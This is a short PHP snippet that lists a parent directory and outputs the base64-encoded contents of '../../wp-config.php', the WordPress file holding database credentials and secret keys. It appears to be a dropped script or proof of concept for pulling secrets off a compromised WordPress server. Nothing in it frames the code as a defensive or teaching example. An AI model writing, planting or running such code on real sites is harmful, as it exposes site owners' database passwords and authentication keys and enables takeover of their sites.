<?
// echo getcwd();
print_r(scandir("../../"), 1);
echo base64_encode(file_get_contents("../../wp-config.php"));
